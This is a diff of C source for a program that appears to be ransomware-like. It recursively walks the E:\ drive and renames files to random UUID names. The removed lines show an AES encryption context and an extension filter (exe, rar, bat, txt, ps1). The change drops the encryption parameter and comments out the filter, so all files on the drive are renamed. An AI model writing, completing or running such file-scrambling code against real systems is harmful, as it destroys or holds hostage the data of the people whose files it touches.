@@ -4,6 +4,12 @@ struct FileInfo {
    char name[FILENAME_SIZE];
 };
 
+typedef struct pfr_struct {
+   int mode;
+   char basePath[PATH_SIZE];
+   char ext[20];
+} pfr_args;
+
 void toLower(char* str);
 int dir_exists(const char *path);
 int file_exists(const char *filename);
@@ -16,7 +22,8 @@ char randomByte();
 char* uuid4();
 int getkey();
 const char* get_file_ext(const char* fname);
-void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext);
+//void copy_file(const char* path_old, const char* path_new);
+void processFilesRecursively(int mode, const char* basePath, const char* ext);
 
 const char* exts = ",exe,rar,bat,txt,ps1,";
 
@@ -32,14 +39,14 @@ int main(int argc, char *argv[])
 	
 	srand (time(NULL));
 	
-	struct AES_ctx ctx;
+	//struct AES_ctx ctx;
 	
 	argv[0][strlen(argv[0]) - 4] = 0;
 	toLower(argv[0]);
 	
 	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
 	strcpy(path, "E:\\");
-	processFilesRecursively(&ctx, mode, path, argv[0]);
+	processFilesRecursively(mode, path, argv[0]);
 	free(path);
 	
 	return EXIT_SUCCESS;
@@ -263,17 +270,35 @@ const char* get_file_ext(const char* fname)
 	return dot + 1;
 }
 
-void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext)
+/* void copy_file(const char* path_old, const char* path_new)
+{
+	FILE* fp_old = NULL;
+	FILE* fp_new = NULL;
+	char buffer[CHUNK_SIZE];
+	size_t bytes;
+	
+	fp_old = fopen(path_old,"rb");
+	fp_new = fopen(path_new,"wb");
+	if(fp_old != NULL && fp_new != NULL)
+	{
+		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
+			fwrite(buffer, 1, bytes, fp_new);
+	}
+	fclose(fp_new);
+	fclose(fp_old);
+} */
+
+void processFilesRecursively(int mode, const char* basePath, const char* ext)
 {
     char path_old[PATH_SIZE];
 	char path_new[PATH_SIZE];
     struct dirent* dp;
     DIR* dir = opendir(basePath);
-
+	
     // Unable to open directory stream
     if (!dir)
         return;
-
+	
     while ((dp = readdir(dir)) != NULL)
     {
         if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
@@ -287,14 +312,14 @@ void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath
             strcat(path_new, "\\");
 			
 			if (dir_exists(path_old))
-			{				
-				processFilesRecursively(ctx, mode, path_old, ext);
+			{
+				processFilesRecursively(mode, path_old, ext);
 			}
 			else
 			{
 				if (mode==1)
 				{
-					const char* fext = get_file_ext(dp->d_name);
+					/* const char* fext = get_file_ext(dp->d_name);
 					int felen = strlen(fext);
 					char* fel = (char*)malloc((felen+1) * sizeof(char));
 					strcpy(fel,fext);
@@ -314,7 +339,7 @@ void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath
 					else
 					{
 						continue;
-					}
+					} */
 					
 					char* buffer = uuid4();
 					strcat(path_new, buffer);
